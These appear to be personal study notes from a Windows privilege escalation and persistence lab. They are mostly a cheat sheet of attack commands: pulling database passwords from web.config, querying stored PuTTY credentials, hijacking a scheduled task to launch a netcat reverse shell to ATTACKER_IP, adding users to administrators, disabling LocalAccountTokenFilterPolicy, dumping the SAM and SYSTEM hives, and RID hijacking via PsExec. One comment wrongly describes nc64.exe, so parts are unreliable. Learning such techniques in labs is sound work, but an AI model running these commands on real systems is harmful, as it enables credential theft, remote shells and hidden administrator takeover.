~~internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

~~reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s //dispaly stored proxy credentials 

schtasks // retrive scheduled tasks
schtasks /query /tn vulntask /fo list /v // to retrive details abt a particular task ie /tn TASKNAME
              always check Task To Run and Run An User
icacls // helps to find the file permission 
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat // nc64.exe is a tool used to change data in binary
schtasks /run /tn vulntask // to run a schtask


~~AccessChk // tool used to check a service DACL from cmd
~~wmic product //to list down all software nad version installed on the target system

Tmapering Unprivilages Users
---------------------------------------
    
~~net localgroup administrators thmuser0 /add //making unprivilageed user thmuser0 to administrators group

ONe of the features implementes by UAC is Local AccountTokenPolicy, strips any local account of its administrative privileges when logging in remotely. While we can elevate our privilages through UAC from GUI. WHile using Evil-WInrm its is confined to a limited access token with no administartive privillages

to regain admin privilages we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
~~reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

reg save hklm\system system.bak //make a backup of SAM and SYSTEM files

adding a user to the Backup Operators group can be achieved without modifying any group membership

SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.

secedit /export /cfg config.inf

secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf

RID hijacking

wmic useraccount get name,sid // to get the RID corresponding to wach username

in order to change RID 500 to a local user we need to access SAM using regedit, which is only accessible by system account, to run regedit as system account use PsExec64.exe tool

PsExec64.exe -i -s regedit
